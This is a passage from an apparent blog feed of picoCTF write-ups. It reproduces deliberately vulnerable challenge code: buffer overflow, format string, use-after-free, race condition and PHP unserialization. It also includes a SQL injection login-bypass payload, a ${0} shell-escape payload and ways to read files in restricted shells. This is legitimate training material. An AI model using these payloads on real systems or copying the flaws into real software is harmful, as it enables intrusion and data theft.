Hint 1: Read about “timing-based side-channel attacks.” Hint 2: Attempting to reverse-engineer or exploit the binary won’t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it. Hint 3: Don’t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.</description></item><item><title>PicoCTF - Sleuthkit Intro</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html</guid><description>PicoCTF - Sleuthkit Intro tags: PicoCTF CTF Misc Challenge: Sleuthkit Intro
Description Download the disk image and use mmls on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.
Download disk image Access checker program: nc saturn.picoctf.net 52279 最新kali之mmls</description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</guid><description>PicoCTF - Some Assembly Required 1 tags: PicoCTF CTF Web Challenge: Some Assembly Required 1
Background 了解 WebAssembly 的基礎使用方法
Source code - After Beautify :::spoiler source code
const strings = ['value', '2wfTpTR', 'instantiate', '275341bEPcme', 'innerHTML', '1195047NznhZg', '1qfevql', 'input', '1699808QuoWhA', 'Correct!', 'check_flag', 'Incorrect!', './JIFxzHyW8W', '23SMpAuA', '802698XOMSrr', 'charCodeAt', '474547vVoGDO', 'getElementById', 'instance', 'copy_char', '43591XxcWUl', '504454llVtzW', 'arrayBuffer', '2NIQmVj', 'result']; const search_string1 = function(id1, _0x53c021) { id1 = id1 - 470; let strings6f = strings[id1]; return strings6f; }; (function(id1, id2) { const search_string = search_string1; while (!![]) { try { const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5)); if (secret_key === id2) break; else id1['push'](id1['shift']()); } catch (_0x41d31a) { id1['push'](id1['shift']()); } } }(strings, 627907)); let exports; (async () => { const search_string = search_string1; let _0x5f0229 = await fetch(search_string(489)), _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()), _0x1f8628 = _0x1d99e9[search_string(470)]; exports = _0x1f8628['exports']; })(); function onButtonPress() { const search_string = search_string1; let input_value = document['getElementById'](search_string(484))[search_string(477)]; // document['getElementById'](input)[value] for (let i = 0; i &lt; input_value['length']; i++) { exports[search_string(471)](input_value[search_string(492)](i), i); } exports['copy_char'](0, input_value['length']), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8); } :::</description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</guid><description>PicoCTF - Some Assembly Required 2 tags: PicoCTF CTF Web Background Source code :::spoiler source
const list_str = ['copy_char', 'value', '207aLjBod', '1301420SaUSqf', '233ZRpipt', '2224QffgXU', 'check_flag', '408533hsoVYx', 'instance', '278338GVFUrH', 'Correct!', '549933ZVjkwI', 'innerHTML', 'charCodeAt', './aD8SvhyVkb', 'result', '977AzKzwq', 'Incorrect!', 'exports', 'length', 'getElementById', '1jIrMBu', 'input', '615361geljRK']; const func1_cal = function(var_a, var_b) { var_a = var_a - 195; let list_strc4 = list_str[var_a]; return list_strc4; }; (function(var_a, var_b) { const func1_cal = func1_cal; while (!![]) { try { const var_c = -parseInt(func1_cal(200)) * -parseInt(func1_cal(201)) + -parseInt(func1_cal(205)) + parseInt(func1_cal(207)) + parseInt(func1_cal(195)) + -parseInt(func1_cal(198)) * parseInt(func1_cal(212)) + parseInt(func1_cal(203)) + -parseInt(func1_cal(217)) * parseInt(func1_cal(199)); if (var_c === var_b) break; else var_a['push'](var_a['shift']()); } catch (_0x4f8a) { var_a['push'](var_a['shift']()); } } }(list_str, 310022)); let exports; (async () => { const func1_cal = func1_cal; let res_1 = await fetch(func1_cal(210)), res_2 = await WebAssembly['instantiate'](await res_1['arrayBuffer']()), res_3 = res_2[func1_cal(204)]; exports = res_3[func1_cal(214)]; })(); function onButtonPress() { const func1_cal = func1_cal; let res_1 = document[func1_cal(216)](func1_cal(218))[func1_cal(197)]; for (let idx = 0; idx &lt; res_1['length']; idx++) { exports[func1_cal(196)](res_1[func1_cal(209)](idx), idx); } exports['copy_char'](0, res_1[func1_cal(215)]), exports[func1_cal(202)]() == 1 ? document['getElementById'](func1_cal(211))[func1_cal(208)] = func1_cal(206) : document[func1_cal(216)](func1_cal(211))['innerHTML'] = func1_cal(213); } :::</description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</guid><description>PicoCTF - Some Assembly Required 3 Background WebAssembly/wabt
$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c Source code :::spoiler rTEuOmSfG3.js
'use strict'; const str_list = ["exports", "270328ewawLo", "instantiate", "1OsuamQ", "Incorrect!", "length", "copy_char", "value", "1512517ESezaM", "innerHTML", "check_flag", "result", "1383842SQRPPf", "924408cukzgO", "getElementById", "418508cLDohp", "input", "Correct!", "573XsMMHp", "arrayBuffer", "183RUQBDE", "38934oMACea"]; const tranfer_fn = function(url, whensCollection) { /** @type {number} */ url = url - 285; let _0x143f7d = str_list[url]; return _0x143f7d; }; (function(data, oldPassword) { const tranfer_fn = tranfer_fn; for (; !![];) { try { const userPsd = -parseInt("length") + -parseInt("573XsMMHp") + -parseInt("innerHTML") * -parseInt("getElementById") + -parseInt("38934oMACea") + parseInt("value") + -parseInt("Incorrect!") * -parseInt("instantiate") + parseInt("arrayBuffer"); if (userPsd === oldPassword) { break; } else { data["push"](data["shift"]()); } } catch (_0x289152) { data["push"](data["shift"]()); } } })(str_list, 970828); let exports; (async() => { const tranfer_fn = tranfer_fn; let rpm_traffic = await fetch("./qCCYI0ajpD"); let m = await WebAssembly["1512517ESezaM"](await rpm_traffic["1OsuamQ"]()); let updatedEdgesById = m["instance"]; exports = updatedEdgesById["copy_char"]; })(); /** * @return {undefined} */ function onButtonPress() { const tranfer_fn = tranfer_fn; let data = document["183RUQBDE"]("exports")["924408cukzgO"]; for (let i = 0; i &lt; data["result"]; i++) { exports["1383842SQRPPf"](data["charCodeAt"](i), i); } exports["1383842SQRPPf"](0, data["result"]); if (exports["input"]() == 1) { document["183RUQBDE"]("Correct!")["418508cLDohp"] = "270328ewawLo"; } else { document["183RUQBDE"]("Correct!")["innerHTML"] = "check_flag"; } } ; :::</description></item><item><title>PicoCTF - Special &amp; Specialer</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html</guid><description>PicoCTF - Special &amp; Specialer tags: PicoCTF CTF General Skill Recon 這兩題都蠻有趣的，感覺打提權應該會用到，所以一起紀錄，第一題是要get shell，關於這一題我是直接看學長之前解題的WP，payload是${0}就直接拿到shell了，詳細的原理我也不清楚，第二題比較簡單，就直接用網路的資源替換一下ls, cat這兩個指令就拿到flag了
Exploit 代替cat的方法：
# Method 1 $ while read line; do while> echo $line; while> done &lt;{filename}} # Method 2 $ exec 3&lt;{filename}} # Assign file descriptor 3 for reading $ while read -u 3 line; do while> echo $line while> done # Method 3 $ echo "$(&lt;{filename})" 代替ls的方法
# Method 1 $ echo * # Method 2 $ echo */* # Method 3 $ echo * .* # Method 4 $ dir # Method 5 $ printf '%s\n' * # Method 6 $ grep -l '.*' ./* # Method 7 $ find . # Method 8 $ stat -c '%s %A %n' * # Method 9 $ lsattr ./* # Method 10 $ vim . Reference Cat without cat on the commandline Alternatives to the ’ls’ command to list the contents of a directory</description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</guid><description>PicoCTF - SQLiLite tags: PicoCTF CTF Web Challenge: http://saturn.picoctf.net:55837/
Exploit - sqli Payload: admin' or '1'='1' -- #</description></item><item><title>PicoCTF - SRA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html</guid><description>PicoCTF - SRA tags: PicoCTF CTF Crypto Source code :::spoiler Source Code
from Crypto.Util.number import getPrime, inverse, bytes_to_long from string import ascii_letters, digits from random import choice pride = "".join(choice(ascii_letters + digits) for _ in range(16)) gluttony = getPrime(128) greed = getPrime(128) lust = gluttony * greed sloth = 65537 envy = inverse(sloth, (gluttony - 1) * (greed - 1)) anger = pow(bytes_to_long(pride.encode()), sloth, lust) print(f"{anger = }") print(f"{envy = }") print("vainglory?") vainglory = input("> ").strip() if vainglory == pride: print("Conquered!") with open("/challenge/flag.txt") as f: print(f.read()) else: print("Hubris!") :::</description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</guid><description>PicoCTF - stack cache Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 16 #define FLAGSIZE 64 #define INPSIZE 10 /* This program is compiled statically with clang-12 without any optimisations. */ void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = "Enter names"; // *q = "Name 1"; // *r = "Name 2"; unsigned long *age; printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents); printf("Names of user: %p %p %p\n", p,q,r); printf("Age of user: %p\n",age); fflush(stdout); } void vuln(){ char buf[INPSIZE]; printf("Give me a string that gets you the flag\n"); gets(buf); printf("%s\n",buf); return; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); printf("Bye!"); return 0; } :::</description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</guid><description>PicoCTF - Stonk Market Background FMT
Source code :::spoiler
#include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;string.h> #include &lt;time.h> #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf("\nPortfolio as of "); fflush(stdout); system("date"); // TODO: implement this in C fflush(stdout); printf("\n\n"); Stonk *head = p->head; if (!head) { printf("You don't own any stonks!\n"); } while (head) { printf("%d shares of %s\n", head->shares, head->symbol); head = head->next; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares &lt; 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk->shares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i &lt;= MAX_SYM_LEN; i++) { if (i &lt; AI_symbol_len) { stonk->symbol[i] = 'A' + (rand() % 26); } else { stonk->symbol[i] = '\0'; } } stonk->next = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } /* char api_buf[FLAG_BUFFER]; FILE *f = fopen("api","r"); if (!f) { printf("Flag file not found\n"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); */ int money = p->money; int shares = 0; Stonk *temp = NULL; printf("Using patented AI algorithms to buy stonks\n"); while (money > 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp->next = p->head; p->head = temp; money -= shares; } printf("Stonks chosen\n"); char *user_buf = malloc(300 + 1); printf("What is your API token?\n"); scanf("%300s", user_buf); printf("Buying stonks with token:\n"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p->money = (rand() % 2018) + 1; p->head = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p->head; Stonk *next = NULL; while (current) { next = current->next; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf("Memory failure\n"); exit(1); } int resp = 0; printf("Welcome back to the trading app!\n\n"); printf("What would you like to do?\n"); printf("1) Buy some stonks!\n"); printf("2) View my portfolio\n"); scanf("%d", &amp;resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf("Goodbye!\n"); exit(0); } :::</description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</guid><description>PicoCTF - Super Serial tags: PicoCTF CTF Web Background php unserialization
Hint The flag is at ../flag Recon 這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化
robot.txt 一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析 index.phps 用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php :::spoiler Real Source Code
&lt;?php require_once("cookie.php"); if(isset($_POST["user"]) &amp;&amp; isset($_POST["pass"])){ $con = new SQLite3("../users.db"); $username = $_POST["user"]; $password = $_POST["pass"]; $perm_res = new permissions($username, $password); if ($perm_res->is_guest() || $perm_res->is_admin()) { setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"); header("Location: authentication.php"); die(); } else { $msg = '&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'; } } ?> &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"> &lt;link href="style.css" rel="stylesheet"> &lt;script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;div class="row"> &lt;div class="col-sm-9 col-md-7 col-lg-5 mx-auto"> &lt;div class="card card-signin my-5"> &lt;div class="card-body"> &lt;h5 class="card-title text-center">Sign In&lt;/h5> &lt;?php if (isset($msg)) echo $msg; ?> &lt;form class="form-signin" action="index.php" method="post"> &lt;div class="form-label-group"> &lt;input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus> &lt;label for="user">Username&lt;/label> &lt;/div> &lt;div class="form-label-group"> &lt;input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required> &lt;label for="pass">Password&lt;/label> &lt;/div> &lt;button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in&lt;/button> &lt;/form> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - Surfing the Waves</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html</guid><description>PicoCTF - Surfing the Waves tags: PicoCTF CTF Misc Challenge: Surfing the Waves
Description &amp; Hint While you’re going through the FBI’s servers, you stumble across their incredible taste in music. One main.wav you found is particularly interesting, see if you can find the flag! Hint:
Music is cool, but what other kinds of waves are there? Look deep below the surface Exploit - 通靈 Audacity to Analyze The sound seems quite normal but when you zoom in the audio track, it looks like something encode. Read it - scipy.io Use scipy.io library to read it and print the data out. >>> from scipy.io.wavfile import read >>> rate, data = read("./main.wav") >>> print(data) [2007 2503 2005 ... 4503 4501 7501] >>> import numpy as np >>> print(np.unique(data)) [1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1500 1501 1502 1503 1504 1505 1506 1507 1508 1509 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2500 2501 2502 2503 2504 2505 2506 2507 2508 2509 3000 3001 3002 3003 3004 3005 3006 3007 3008 3009 3500 3501 3502 3503 3504 3505 3506 3507 3508 3509 4000 4001 4002 4003 4004 4005 4006 4007 4008 4009 4500 4501 4502 4503 4504 4505 4506 4507 4508 4509 5000 5001 5002 5003 5004 5005 5006 5007 5008 5009 5500 5501 5502 5503 5504 5505 5506 5507 5508 5509 6000 6001 6002 6003 6004 6005 6006 6007 6008 6009 6500 6501 6502 6503 6504 6505 6506 6507 6508 6509 7000 7001 7002 7003 7004 7005 7006 7007 7008 7009 7500 7501 7502 7503 7504 7505 7506 7507 7508 7509 8000 8001 8002 8003 8004 8005 8006 8007 8008 8009 8500 8501 8502 8503 8504 8505 8506 8507 8508 8509] Seems it has some rule $\to$ 1000 ~ 1009 1500 ~ 1509 2000 ~ 2009 … 8500 ~ 8509 It has exactly 16 intervals $\to$ hex value Let’s try to exploit it Whole exploit :::spoiler exploit from scipy.io.wavfile import read from tqdm import trange path = '.' rate, data = read(path + "/main.wav") decode_dic = { 10 : "0", 15 : "1", 20 : "2", 25 : "3", 30 : "4", 35 : "5", 40 : "6", 45 : "7", 50 : "8", 55 : "9", 60 : "A", 65 : "B", 70 : "C", 75 : "D", 80 : "E", 85 : "F", } message = '' for i in trange(len(data)): message += decode_dic[data[i] // 100] print(bytes.fromhex(message).decode()) ::: Then you can get the source code and flag… Reference picoCTF 2021 Surfing the Waves</description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</guid><description>PicoCTF - tic-tac Background 後端工程師面試考什麼 - Race Condition 篇 [Day24]攻擊篇 TOCTTOU
Time of check to time of use 在檢查和使用之間影響資源狀態的攻擊
這種攻擊可能發生在共享資源中。 可能導致程式在資源處於意外狀態時執行無效操作。
Source code :::spoiler Source code
#include &lt;iostream> #include &lt;fstream> #include &lt;unistd.h> #include &lt;sys/stat.h> int main(int argc, char *argv[]) { if (argc != 2) { std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " &lt;filename>" &lt;&lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file's status information. if (stat(filename.c_str(), &amp;statbuf) == -1) { std::cerr &lt;&lt; "Error: Could not retrieve file information" &lt;&lt; std::endl; return 1; } // Check the file's owner. if (statbuf.st_uid != getuid()) { std::cerr &lt;&lt; "Error: you don't own this file" &lt;&lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout &lt;&lt; line &lt;&lt; std::endl; } } else { std::cerr &lt;&lt; "Error: Could not open file" &lt;&lt; std::endl; return 1; } return 0; } :::</description></item><item><title>PicoCTF - Torrent Analyze</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html</guid><description>PicoCTF - Torrent Analyze Background What are seeds, peers and leechers in Torrents’ language? 慎選peer，是加速BT下載的王道！
seed個數：seed（即一般所說的「種子」）意指擁有完整檔案的BT參與者，是主要的檔案提供者。seed越多，可用的BT分享頻寬就越多，速度當然就快。 seed與peer的比例：雖然peer（指尚未取得完整檔案的BT參與者）可同時自seed與其他peer下載檔案，但peer間會彼此競爭，以爭取有限的BT下載頻寬。因此，peer個數越多，分配後的BT分享頻寬就越少，速度自然就受影響。 教你該如何使用bt的info hash特徵碼，下載BT之torrent種子檔
Description &amp; Hint SOS, someone is torrenting on our network. One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}. Hint 1: Download and open the file with a packet analyzer like Wireshark. Hint 2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -> Enabled Protocols Hint 3: Try to understand peers, leechers and seeds. Article Hint 4: The file name ends with .iso</description></item><item><title>PicoCTF - Transformation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</guid><description>PicoCTF - Transformation tags: PicoCTF CTF Reverse Challenge: Transformation
Source code enc file content: 灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽 Transformation Code
''.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) Seems it shift the first character with 8 bits and concatenate the 2nd character then go through len(flag)
Exploit My perspective is just recover the strings :::spoiler
flag = '灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽' enc = '' def decimalToBinary(n): return bin(n).replace("0b", "") def binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = ['0'] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp &lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = '' while i >= 0: hex_string += hexaDeciNum[i] i = i-1 return hex_string for i in range(0, len(flag)): plaintext1 = decimalToBinary(ord(flag[i])) while(len(plaintext1) != 16): plaintext1 = '0' + plaintext1 plaintext2 = plaintext1[-8:] plaintext1 = plaintext1[0:8] enc += binToHexa(plaintext1) enc += binToHexa(plaintext2) print(bytes.fromhex(enc).decode('utf-8')) :::</description></item><item><title>PicoCTF - Trivial Flag Transfer Protocol</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html</guid><description>PicoCTF - Trivial Flag Transfer Protocol tags: PicoCTF CTF Misc Challenge: Trivial Flag Transfer Protocol
Background TFTP協定是什麼？
Wireless router中的UPnP是做什麼用的?
UPnP 是一種通訊協定，其主要功能是供家中的設備可以輕易的且自動的連結到網路並完成網路相關設定。 不需要您本人手動去設定就可以使用的意思。 所以你的 router 有支援並打開這項功能後，您家中的視訊設備（大部分都是支援UPnP）接上網路、打開電源。 接著你的 作業系統也支援的話，以winodws 為例，「我的電腦」中就會看到您新增的設備，如無線router、media server等等。
SSDP - 通訊協定 ?
SSDP的全寫是「Simple Service Discovery Protocol」，使用在Universal Plug and Play (UPnP)網絡環境中。SSDP使用UDP1900連接埠搜尋互聯網上的數據。當SSDP開啟時，其他設置會曝露自己到所有UPnP的用戶端中。
steghide instruction
Exploit - TFTP + steghide Save files According to the article: TFTP協定是什麼？, we can aware that this protocol is aim to transfer the data without authentication. So, we can download the files using wireshark.</description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</guid><description>PicoCTF - two-sum Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> static int addIntOvf(int result, int a, int b) { result = a + b; if(a > 0 &amp;&amp; b > 0 &amp;&amp; result &lt; 0) return -1; if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result > 0) return -1; return 0; } int main() { int num1, num2, sum; FILE *flag; char c; printf("n1 > n1 + n2 OR n2 > n1 + n2 \n"); fflush(stdout); printf("What two positive numbers can make this possible: \n"); fflush(stdout); if (scanf("%d", &amp;num1) &amp;&amp; scanf("%d", &amp;num2)) { printf("You entered %d and %d\n", num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) { printf("No overflow\n"); fflush(stdout); exit(0); } else if (addIntOvf(sum, num1, num2) == -1) { printf("You have an integer overflow\n"); fflush(stdout); } if (num1 > 0 || num2 > 0) { flag = fopen("flag.txt","r"); if(flag == NULL){ printf("flag not found: please run this on the server\n"); fflush(stdout); exit(0); } char buf[60]; fgets(buf, 59, flag); printf("YOUR FLAG IS: %s\n", buf); fflush(stdout); exit(0); } } return 0; } :::</description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</guid><description>PicoCTF - Unsubscriptions Are Free Background Heap Exploitation / Used After Free
Source code :::spoiler Source Code
#include &lt;stdint.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;ctype.h> #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr(){ char buf[FLAG_BUFFER]; FILE *f = fopen("flag.txt","r"); fgets(buf,FLAG_BUFFER,f); fprintf(stdout,"%s\n",buf); fflush(stdout); } char * getsline(void) { getchar(); char * line = malloc(100), * linep = line; size_t lenmax = 100, len = lenmax; int c; if(line == NULL) return NULL; for(;;) { c = fgetc(stdin); if(c == EOF) break; if(--len == 0) { len = lenmax; char * linen = realloc(linep, lenmax *= 2); if(linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if((*line++ = c) == '\n') break; } *line = '\0'; return linep; } void doProcess(cmd* obj) { (*obj->whatToDo)(); } void s(){ printf("OOP! Memory leak...%p\n",hahaexploitgobrrr); puts("Thanks for subsribing! I really recommend becoming a premium member!"); } void p(){ puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)"); } void m(){ puts("Account created."); } void leaveMessage(){ puts("I only read premium member messages but you can "); puts("try anyways:"); char* msg = (char*)malloc(8); read(0, msg, 8); } void i(){ char response; puts("You're leaving already(Y/N)?"); scanf(" %c", &amp;response); if(toupper(response)=='Y'){ puts("Bye!"); free(user); }else{ puts("Ok. Get premium membership please!"); } } void printMenu(){ puts("Welcome to my stream! ^W^"); puts("=========================="); puts("(S)ubscribe to my channel"); puts("(I)nquire about account deletion"); puts("(M)ake an Twixer account"); puts("(P)ay for premium membership"); puts("(l)eave a message(with or without logging in)"); puts("(e)xit"); } void processInput(){ scanf(" %c", &amp;choice); choice = toupper(choice); switch(choice){ case 'S': if(user){ user->whatToDo = (void*)s; }else{ puts("Not logged in!"); } break; case 'P': user->whatToDo = (void*)p; break; case 'I': user->whatToDo = (void*)i; break; case 'M': user->whatToDo = (void*)m; puts("==========================="); puts("Registration: Welcome to Twixer!"); puts("Enter your username: "); user->username = getsline(); break; case 'L': leaveMessage(); break; case 'E': exit(0); default: puts("Invalid option!"); exit(1); break; } } int main(){ setbuf(stdout, NULL); user 